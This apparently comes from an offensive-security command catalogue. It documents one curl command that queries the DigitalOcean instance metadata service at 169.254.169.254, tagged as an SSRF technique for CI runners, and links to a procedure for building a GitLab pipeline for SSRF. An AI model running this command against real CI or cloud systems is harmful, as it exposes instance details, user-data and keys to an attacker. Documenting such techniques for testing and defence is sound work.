---
id: cmd-uuid-1
data: 'curl -L http://169.254.169.254/metadata/v1/'
tags:
  - ssrf
  - metadata
type: command
output: >-
  List of metadata paths like id, hostname, user-data, vendor-data, public-keys,
  region, interfaces/, dns/, floating_ip/, tags/, features/
executor: bash
platforms:
  - Linux
  - Cloud
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.527Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-digitalocean-metadata

## Command

```bash
curl -L http://169.254.169.254/metadata/v1/
```

## Description

Fetch DigitalOcean instance metadata endpoints via SSRF in CI runner, revealing internal instance details on re-run.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-L` | Follow redirects | Yes |
| `http://169.254.169.254/metadata/v1/` | Metadata service URL | Yes |

## Examples

### Basic Usage

```bash
curl -L http://169.254.169.254/metadata/v1/
```

### Advanced Usage

Not applicable; fixed URL for SSRF.

## Expected Output

List of metadata paths like id, hostname, user-data, vendor-data, public-keys, region, interfaces/, dns/, floating_ip/, tags/, features/.

## Related

- [[Related Procedure: Setup-GitLab-CI-Pipeline-for-SSRF]]
